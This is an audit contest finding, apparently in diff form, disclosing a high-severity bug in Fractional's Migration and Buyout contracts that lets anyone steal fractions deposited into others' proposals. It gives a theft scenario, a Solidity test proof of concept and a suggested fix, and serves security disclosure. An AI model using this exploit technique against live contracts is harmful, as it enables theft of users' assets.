@@ -1,0 +1,16 @@
+[H-06] Any fractions deposited into any proposal can be stolen at any time until it is commited
+Submitted by panprog, also found by 0x52, 0xsanson, hansfriese, shenwilly, and zzzitron
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L210
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L73
+Impact
+When buyout starts, it takes all fractions owned by proposer. This means that whenMigrationcontract starts a buyout, it takes all fractions it has, not just the fractions from the proposal. This is easily exploitable by anyone.
+Stealing fractions scenario:
+Bob starts a proposal, deposits3000fractionsAlice immediately starts another proposal withtargetPrice = 0, deposits0 fractionsand minimal ether (value: 1, which is10^-18 ether)Since price is larger than targetPrice, Alice immediately commits the proposalBuyout is started, but instead of0 fractionsit has3000 fractionsfrom bob, because starting buyout took allMigration’s fractions.Alice immediately buys3000 fractionsfrom buyout for free (0 ether).At this point Alice has successfully stolen all deposited fractions.
+Proof of Concept
+Add this code to test/Migration.t.sol
+function testPanprogBugH4() public {initializeMigration(alice, bob, 10000, 10000, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory newModules = new address[](2);newModules[0] = migration;newModules[1] = modules[1];// Bob makes the proposalbob.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,10 ether);// Bob joins the proposal with 3000 fractionsbob.migrationModule.join{value: 1 ether}(vault, 1, 3000);// Alice starts a competing proposal (we use bob's data for simplicity)alice.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 10,0 ether);// Alice joins her proposal with 0 fractions and minimum allowed ether (for the price to be above target)alice.migrationModule.join{value: 1}(vault, 2, 0);// since the target price is reached, alice starts the buyout on her proposalalice.migrationModule.commit(vault, 2);// at this point buyout should be empty, but in fact due to bug it has 3000 fractions from bob// alice can now buy fractions from buyout for free (it should revert, but it doesn't)vm.expectRevert(abi.encodeWithSelector(IBuyout.InvalidPayment.selector));alice.buyoutModule.buyFractions(vault, 3000);}
+Recommended Mitigation Steps
+Buyoutstartfunction should include amount of fractions a proposer deposits, andMigration’scommitfunction should specify correct fractions amount when starting a buyout.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+An attacker can steal fractions that have that have been used to join a migration. Agree this is a High risk issue.Making this submission the primary instance for including a coded POC.
